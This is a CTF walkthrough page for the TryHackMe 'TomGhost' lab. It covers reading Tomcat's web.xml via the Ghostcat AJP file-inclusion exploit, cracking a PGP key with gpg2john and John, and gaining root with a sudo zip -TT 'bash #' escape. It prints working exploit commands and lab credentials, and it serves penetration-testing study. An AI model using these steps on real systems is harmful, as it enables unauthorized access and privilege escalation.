---
sidebar_position: 2
title: TomGhost 
sidebar_label: Exploitation
description: Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
keywords: [tomghost, tomghost tryhackme, tom ghost exploit, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, ghostcat, zip privilege escalation]
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';


## Ghostcat 

The **Apache `Ghostcat`** is a **File Inclusion Vulnerability.** It allows an Attacker to **Read Files such as Configuration Files or any Tomcat Directory Files.** In addition if an User is abe to **Upload Files** an Attacker can Upload the File cotaining Malicious `JSP` Code and then include the Uploaded file by Exploiting Ghostcat Vulnerability resulting in <b style={{ color: 'Red' }}>RCE.</b>

**Vulnerable Apache Versions:** <b style={{ color: 'Plum' }}>6.x - 7.x - 8.x - 9.x</b>

<br/>

- **Used Exploit:** <a class="button button--outline button--danger" href="https://www.exploit-db.com/exploits/48143">EDB-ID: 48143</a>
- **Reading:** `/opt/tomcat/webapps/ROOT/WEB-INF/web.xml` using the **Automated Exploit.**
- **Username - Password:** <b style={{ color: 'Chartreuse' }}>skyfuck</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>8730281lkjlkjdqlksalks</b>


<br/>

```xml
attacker@machine:~$ python2 48143.py 10.10.29.49 -p 8009
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
    ...
  <display-name>Welcome to Tomcat</display-name>
  <description>
    Welcome to GhostCat
    // highlight-next-line
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

<br/>


## Decrypting PGP

- **Using `SSH` Credentials to Login:** <b style={{ color: 'Chartreuse' }}>skyfuck</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>8730281lkjlkjdqlksalks</b>

```bash
skyfuck@ubuntu:~$ id
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
```

<br/>

- **Found `PGP` Key:** `tryhackme.asc` **PGP Encrypted File:** `credentials.pgp`

```bash
skyfuck@ubuntu:~$ ls -l
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

<br/>
<br/>

- **The `PGP` Key:** `tryhackme.asc` is Password Protected we can use `John` to **Brute-Force** it.
- But first we need to Transform the `PGP` Key into `John` **Readable Format.** We can do that with `gpg2john`.

```log
gpg2john tryhackme.asc > hash
```

<br/>

- **Password:** <b style={{ color: 'Coral' }}>alexandru</b>

```log
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
alexandru        (tryhackme)
```

<br/>
<br/>

- Importing - Decrypting `PGP` File: `credentials.pgp`
- **Username - Password:** <b style={{ color: 'Chartreuse' }}>merlin</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</b>

:::info [GPG] Import - Decrypt

<Tabs>
  <TabItem value="gpg" label="IMPORT"> 
    <div style={{color: 'red'}}>

```log
attacker@machine:~$ gpg --decrypt credential.pgp
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1 
```

</div>
  </TabItem>
  <TabItem value="pgp" label="DECRYPT"> 
    <div style={{color: 'red'}}>

```log
attacker@machine:~$ gpg --decrypt credential.pgp
pg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
// highlight-next-line
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
```

</div>
  </TabItem>
</Tabs>

:::


<br/>

---
## Privilege Escalation


- **Using `SSH` Credentials to Login:** <b style={{ color: 'Chartreuse' }}>merlin</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</b>

```bash
merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

<br/>


- **The User `merlin` can run:** <b style={{ color: 'LightGreen' }}>/usr/bin/zip</b> as <b style={{ color: 'Red' }}>Root</b>

```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

<br/>

- Using <b style={{ color: 'LightGreen' }}>/usr/bin/zip</b> to Escalate Privileges.

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'bash #'
```

```bash
root@ubuntu:~$ id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~$ whoami
root
```

---